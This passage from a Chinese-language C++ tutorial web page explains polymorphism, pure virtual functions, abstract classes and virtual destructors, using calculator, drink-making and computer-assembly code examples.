class="built_in">DoSpeak</span>(dog);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：</p>
<p>多态满足条件</p>
<ul>
<li>有继承关系</li>
<li>子类重写父类中的虚函数</li>
</ul>
<p>多态使用条件</p>
<ul>
<li>父类指针或引用指向子类对象</li>
</ul>
<p>重写：函数返回值类型  函数名 参数列表 完全一致称为重写</p>
<h4 id="4-7-2-多态案例一-计算器类"><a href="#4-7-2-多态案例一-计算器类" class="headerlink" title="4.7.2 多态案例一-计算器类"></a>4.7.2 多态案例一-计算器类</h4><p>案例描述：</p>
<p>分别利用普通写法和多态技术，设计实现两个操作数进行运算的计算器类</p>
<p>多态的优点：</p>
<ul>
<li>代码组织结构清晰</li>
<li>可读性强</li>
<li>利于前期和后期的扩展以及维护</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//普通实现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getResult</span><span class="params">(string oper)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (oper == <span class="string">&quot;+&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> m_Num1 + m_Num2;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (oper == <span class="string">&quot;-&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> m_Num1 - m_Num2;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (oper == <span class="string">&quot;*&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> m_Num1 * m_Num2;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//如果要提供新的运算，需要修改源码</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_Num1;</span><br><span class="line">	<span class="type">int</span> m_Num2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//普通实现测试</span></span><br><span class="line">	Calculator c;</span><br><span class="line">	c.m_Num1 = <span class="number">10</span>;</span><br><span class="line">	c.m_Num2 = <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; c.m_Num1 &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; c.<span class="built_in">getResult</span>(<span class="string">&quot;+&quot;</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; c.m_Num1 &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; c.<span class="built_in">getResult</span>(<span class="string">&quot;-&quot;</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; c.m_Num1 &lt;&lt; <span class="string">&quot; * &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; c.<span class="built_in">getResult</span>(<span class="string">&quot;*&quot;</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//多态实现</span></span><br><span class="line"><span class="comment">//抽象计算器类</span></span><br><span class="line"><span class="comment">//多态优点：代码组织结构清晰，可读性强，利于前期和后期的扩展以及维护</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AbstractCalculator</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">getResult</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> m_Num1;</span><br><span class="line">	<span class="type">int</span> m_Num2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加法计算器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddCalculator</span> :<span class="keyword">public</span> AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getResult</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> m_Num1 + m_Num2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//减法计算器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubCalculator</span> :<span class="keyword">public</span> AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getResult</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> m_Num1 - m_Num2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//乘法计算器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MulCalculator</span> :<span class="keyword">public</span> AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getResult</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> m_Num1 * m_Num2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//创建加法计算器</span></span><br><span class="line">	AbstractCalculator *abc = <span class="keyword">new</span> AddCalculator;</span><br><span class="line">	abc-&gt;m_Num1 = <span class="number">10</span>;</span><br><span class="line">	abc-&gt;m_Num2 = <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; abc-&gt;<span class="built_in">getResult</span>() &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">delete</span> abc;  <span class="comment">//用完了记得销毁</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建减法计算器</span></span><br><span class="line">	abc = <span class="keyword">new</span> SubCalculator;</span><br><span class="line">	abc-&gt;m_Num1 = <span class="number">10</span>;</span><br><span class="line">	abc-&gt;m_Num2 = <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; abc-&gt;<span class="built_in">getResult</span>() &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">delete</span> abc;  </span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建乘法计算器</span></span><br><span class="line">	abc = <span class="keyword">new</span> MulCalculator;</span><br><span class="line">	abc-&gt;m_Num1 = <span class="number">10</span>;</span><br><span class="line">	abc-&gt;m_Num2 = <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="string">&quot; * &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; abc-&gt;<span class="built_in">getResult</span>() &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">delete</span> abc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>总结：C++开发提倡利用多态设计程序架构，因为多态优点很多</p>
</blockquote>
<h4 id="4-7-3-纯虚函数和抽象类"><a href="#4-7-3-纯虚函数和抽象类" class="headerlink" title="4.7.3 纯虚函数和抽象类"></a>4.7.3 纯虚函数和抽象类</h4><p>在多态中，通常父类中虚函数的实现是毫无意义的，主要都是调用子类重写的内容</p>
<p>因此可以将虚函数改为<strong>纯虚函数</strong></p>
<p>纯虚函数语法：<code>virtual 返回值类型 函数名 （参数列表）= 0 ;</code></p>
<p>当类中有了纯虚函数，这个类也称为&#x3D;&#x3D;抽象类&#x3D;&#x3D;</p>
<p><strong>抽象类特点</strong>：</p>
<ul>
<li>无法实例化对象</li>
<li>子类必须重写抽象类中的纯虚函数，否则也属于抽象类</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//纯虚函数</span></span><br><span class="line">	<span class="comment">//类中只要有一个纯虚函数就称为抽象类</span></span><br><span class="line">	<span class="comment">//抽象类无法实例化对象</span></span><br><span class="line">	<span class="comment">//子类必须重写父类中的纯虚函数，否则也属于抽象类</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> :<span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;func调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Base * base = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//base = new Base; // 错误，抽象类无法实例化对象</span></span><br><span class="line">	base = <span class="keyword">new</span> Son;</span><br><span class="line">	base-&gt;<span class="built_in">func</span>();</span><br><span class="line">	<span class="keyword">delete</span> base;<span class="comment">//记得销毁</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>















<h4 id="4-7-4-多态案例二-制作饮品"><a href="#4-7-4-多态案例二-制作饮品" class="headerlink" title="4.7.4 多态案例二-制作饮品"></a>4.7.4 多态案例二-制作饮品</h4><p><strong>案例描述：</strong></p>
<p>制作饮品的大致流程为：煮水 -  冲泡 - 倒入杯中 - 加入辅料</p>
<p>利用多态技术实现本案例，提供抽象制作饮品基类，提供子类制作咖啡和茶叶</p>




<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抽象制作饮品</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AbstractDrinking</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//烧水</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Boil</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//冲泡</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Brew</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//倒入杯中</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PourInCup</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//加入辅料</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PutSomething</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//规定流程</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">MakeDrink</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="built_in">Boil</span>();</span><br><span class="line">		<span class="built_in">Brew</span>();</span><br><span class="line">		<span class="built_in">PourInCup</span>();</span><br><span class="line">		<span class="built_in">PutSomething</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//制作咖啡</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Coffee</span> : <span class="keyword">public</span> AbstractDrinking &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//烧水</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Boil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;煮农夫山泉!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//冲泡</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Brew</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;冲泡咖啡!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//倒入杯中</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PourInCup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;将咖啡倒入杯中!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//加入辅料</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PutSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;加入牛奶!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//制作茶水</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tea</span> : <span class="keyword">public</span> AbstractDrinking &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//烧水</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Boil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;煮自来水!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//冲泡</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Brew</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;冲泡茶叶!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//倒入杯中</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PourInCup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;将茶水倒入杯中!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//加入辅料</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">PutSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;加入枸杞!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//业务函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DoWork</span><span class="params">(AbstractDrinking* drink)</span> </span>&#123;</span><br><span class="line">	drink-&gt;<span class="built_in">MakeDrink</span>();</span><br><span class="line">	<span class="keyword">delete</span> drink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">DoWork</span>(<span class="keyword">new</span> Coffee);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;--------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">DoWork</span>(<span class="keyword">new</span> Tea);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



















<h4 id="4-7-5-虚析构和纯虚析构"><a href="#4-7-5-虚析构和纯虚析构" class="headerlink" title="4.7.5 虚析构和纯虚析构"></a>4.7.5 虚析构和纯虚析构</h4><p>多态使用时，如果子类中有属性开辟到堆区，那么父类指针在释放时无法调用到子类的析构代码</p>
<p>解决方式：将父类中的析构函数改为<strong>虚析构</strong>或者<strong>纯虚析构</strong></p>
<p>虚析构和纯虚析构共性：</p>
<ul>
<li>可以解决父类指针释放子类对象</li>
<li>都需要有具体的函数实现</li>
</ul>
<p>虚析构和纯虚析构区别：</p>
<ul>
<li>如果是纯虚析构，该类属于抽象类，无法实例化对象</li>
</ul>
<p>虚析构语法：</p>
<p><code>virtual ~类名()&#123;&#125;</code></p>
<p>纯虚析构语法：</p>
<p><code> virtual ~类名() = 0;</code></p>
<p><code>类名::~类名()&#123;&#125;</code></p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Animal</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Animal 构造函数调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Speak</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//析构函数加上virtual关键字，变成虚析构函数</span></span><br><span class="line">	<span class="comment">//virtual ~Animal()</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; &quot;Animal虚析构函数调用！&quot; &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">Animal</span>() = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Animal::~<span class="built_in">Animal</span>()</span><br><span class="line">&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Animal 纯虚析构函数调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//和包含普通纯虚函数的类一样，包含了纯虚析构函数的类也是一个抽象类。不能够被实例化。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> : <span class="keyword">public</span> Animal &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Cat</span>(string name)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Cat构造函数调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		m_Name = <span class="keyword">new</span> <span class="built_in">string</span>(name);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; *m_Name &lt;&lt;  <span class="string">&quot;小猫在说话!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Cat</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Cat析构函数调用!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Name != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">delete</span> m_Name;</span><br><span class="line">			m_Name = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string *m_Name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Animal *animal = <span class="keyword">new</span> <span class="built_in">Cat</span>(<span class="string">&quot;Tom&quot;</span>);</span><br><span class="line">	animal-&gt;<span class="built_in">Speak</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//通过父类指针去释放，会导致子类对象可能清理不干净，造成内存泄漏</span></span><br><span class="line">	<span class="comment">//怎么解决？给基类增加一个虚析构函数</span></span><br><span class="line">	<span class="comment">//虚析构函数就是用来解决通过父类指针释放子类对象</span></span><br><span class="line">	<span class="keyword">delete</span> animal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>总结：</p>
<p>​	1. 虚析构或纯虚析构就是用来解决通过父类指针释放子类对象</p>
<p>​	2. 如果子类中没有堆区数据，可以不写为虚析构或纯虚析构</p>
<p>​	3. 拥有纯虚析构函数的类也属于抽象类</p>
<h4 id="4-7-6-多态案例三-电脑组装"><a href="#4-7-6-多态案例三-电脑组装" class="headerlink" title="4.7.6 多态案例三-电脑组装"></a>4.7.6 多态案例三-电脑组装</h4><p><strong>案例描述：</strong></p>
<p>电脑主要组成部件为 CPU（用于计算），显卡（用于显示），内存条（用于存储）</p>
<p>将每个零件封装出抽象基类，并且提供不同的厂商生产不同的零件，例如Intel厂商和Lenovo厂商</p>
<p>创建电脑类提供让电脑工作的函数，并且调用每个零件工作的接口</p>
<p>测试时组装三台不同的电脑进行工作</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象CPU类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CPU</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//抽象的计算函数</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">calculate</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象显卡类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VideoCard</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//抽象的显示函数</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">display</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象内存条类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Memory</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//抽象的存储函数</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">storage</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//电脑类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Computer</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Computer</span>(CPU * cpu, VideoCard * vc, Memory * mem)</span><br><span class="line">	&#123;</span><br><span class="line">		m_cpu = cpu;</span><br><span class="line">		m_vc = vc;</span><br><span class="line">		m_mem = mem;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//提供工作的函数</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">work</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">//让零件工作起来，调用接口</span></span><br><span class="line">		m_cpu-&gt;<span class="built_in">calculate</span>();</span><br><span class="line"></span><br><span class="line">		m_vc-&gt;<span class="built_in">display</span>();</span><br><span class="line"></span><br><span class="line">		m_mem-&gt;<span class="built_in">storage</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//提供析构函数 释放3个电脑零件</span></span><br><span class="line">	~<span class="built_in">Computer</span>()</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//释放CPU零件</span></span><br><span class="line">		<span class="keyword">if</span> (m_cpu != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_cpu;</span><br><span class="line">			m_cpu = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//释放显卡零件</span></span><br><span class="line">		<span class="keyword">if</span> (m_vc != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_vc;</span><br><span class="line">			m_vc = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//释放内存条零件</span></span><br><span class="line">		<span class="keyword">if</span> (m_mem != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_mem;</span><br><span class="line">			m_mem = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">	CPU * m_cpu; <span class="comment">//CPU的零件指针</span></span><br><span class="line">	VideoCard * m_vc; <span class="comment">//显卡零件指针</span></span><br><span class="line">	Memory * m_mem; <span class="comment">//内存条零件指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具体厂商</span></span><br><span class="line"><span class="comment">//Intel厂商</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IntelCPU</span> :<span class="keyword">public</span> CPU</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">calculate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Intel的CPU开始计算了！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IntelVideoCard</span> :<span class="keyword">public</span> VideoCard</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">display</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Intel的显卡开始显示了！&quot;</span> &lt;&lt; endl;</span><br><span 